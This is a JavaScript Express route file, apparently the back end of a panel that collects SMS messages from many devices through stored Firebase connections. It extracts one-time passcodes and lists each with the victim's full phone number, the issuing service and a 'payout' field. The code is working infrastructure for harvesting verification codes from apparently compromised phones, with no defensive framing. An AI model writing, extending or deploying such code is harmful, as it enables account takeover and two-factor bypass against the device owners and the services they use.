"use strict";

/**
 * OTP API v2 — Clean JSON, no cache, full phone numbers.
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { getPhone } = require("../utils/phone");

const router = Router();

function findPhone(device, rawClient, deviceMessages) {
  return getPhone(device, rawClient, deviceMessages);
}

router.get("/otp", async (req, res, next) => {
  try {
    const countParam = req.query.count;
    let count;
    if (countParam === "0" || countParam === "all") count = 0;
    else if (countParam) count = Math.min(parseInt(countParam) || 50, 500);
    else count = 50;

    const connections = await ConnectionsService.getAllActive();
    if (!connections.length) {
      return res.type("application/json").send(JSON.stringify({ status: "success", total: 0, data: [] }, null, 4));
    }

    const allOtps = [];

    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = devices.find((d) => d.id === deviceId);
              const rawClient = clientsData?.[deviceId];
              const phone = findPhone(device, rawClient, deviceMessages);

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;
                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;
                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                connOtps.push({
                  dt: getTimestamp(msg),
                  num: phone || "Unknown",
                  cli: extracted.service,
                  message: text.trim(),
                  payout: "0",
                });
              }
            }
          }
          return connOtps;
        } catch { return []; }
      })
    );

    for (const r of results) {
      if (r.status === "fulfilled") allOtps.push(...r.value);
    }

    allOtps.sort((a, b) => (new Date(b.dt).getTime() || 0) - (new Date(a.dt).getTime() || 0));

    const sliced = count > 0 ? allOtps.slice(0, count) : allOtps;
    res.type("application/json").send(JSON.stringify({ status: "success", total: sliced.length, data: sliced }, null, 4));
  } catch (err) {
    next(err);
  }
});

function getTimestamp(msg) {
  const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt || msg.createdAt || msg.sentAt || msg.ts || "";
  if (!raw) return fmtDate(new Date());
  if (typeof raw === "number") return fmtDate(new Date(raw > 1e12 ? raw : raw * 1000));
  const d = new Date(raw);
  if (!isNaN(d.getTime())) return fmtDate(d);
  if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) return raw.replace(/\//g, "-").slice(0, 19);
  return fmtDate(new Date());
}

function fmtDate(d) {
  const p = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${p(d.getUTCMonth()+1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())}`;
}

module.exports = router;
